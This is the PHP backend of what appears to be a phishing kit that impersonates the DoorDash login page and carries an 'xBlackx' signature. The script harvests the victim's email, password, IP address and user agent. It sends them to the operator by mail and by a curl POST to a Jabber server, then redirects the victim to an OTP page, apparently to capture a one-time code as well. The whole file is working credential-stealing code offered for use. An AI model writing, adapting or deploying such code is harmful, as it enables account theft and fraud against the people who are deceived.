<?php
ob_start();
include 'config.php';
$request_body = file_get_contents('php://input');
$request_data = json_decode($request_body);
$date = date("d M, Y");
$time = date("g:i a");
$date = trim($date . ", Time : " . $time);

$email = $request_data->email;
$password = $request_data->password;
$userIp = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];

# Subject    
$subject = "DoorDash Login From [ ".$userIp." ]";

# Message Content
$message = "========= DoorDash xBlackx ========="."\n";
$message .= "Email : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "=========[ 𝒟𝐸𝒱𝐼𝒞𝐸 𝐼𝒩𝐹o ]========="."\n";
$message .= "User Agent : {$userAgent}"."\n";
$message .= "IP : {$userIp}"."\n";
$message .= "Date : {$date}"."\n";
$message .= "=========[𝓍𝐵𝓁𝒶𝒸𝒦𝓍]========="."\n";

$headers  = 'MIME-Version: 1.0' . "\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\n";
$headers .= 'From: xBlacKx <admin@xblackxcoder.codes>' . "\n";

# Send Mail
@mail($toEmail, $subject, $message, $headers);

$jabberURL = 'https://' . $jabberServer . ':5281';
$jabberFields = array(
    'type' => 'chat',
    'to' => $jabberRecipient,
    'body' => $message
);
$jabberHeaders = array(
    'Authorization: Basic ' . base64_encode($jabberUser . ':' . $jabberPass),
    'Content-Type: application/xml'
);
$jabberCh = curl_init();
curl_setopt($jabberCh, CURLOPT_URL, $jabberURL);
curl_setopt($jabberCh, CURLOPT_RETURNTRANSFER, true);
curl_setopt($jabberCh, CURLOPT_POST, true);
curl_setopt($jabberCh, CURLOPT_POSTFIELDS, '<message type="' . $jabberFields['type'] . '" to="' . $jabberFields['to'] . '"><body>' . $jabberFields['body'] . '</body></message>');
curl_setopt($jabberCh, CURLOPT_HTTPHEADER, $jabberHeaders);
curl_setopt($jabberCh, CURLOPT_SSL_VERIFYPEER, false); // Set to true if your Jabber server has a valid SSL certificate
$jabberResult = curl_exec($jabberCh);
curl_close($jabberCh);

header('Location: ./otp.php?hash='.md5('xBlackxCoder'));exit();
?>